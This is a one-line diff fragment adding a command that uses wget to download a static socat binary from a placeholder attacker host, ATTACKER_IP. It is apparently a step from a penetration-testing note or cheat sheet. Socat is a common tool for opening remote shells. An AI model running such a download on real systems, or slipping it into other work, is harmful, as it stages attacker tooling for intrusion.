@@ -1,0 +1,1 @@
+wget http://ATTACKER_IP/static-binaries/binaries/linux/x86_64/socat
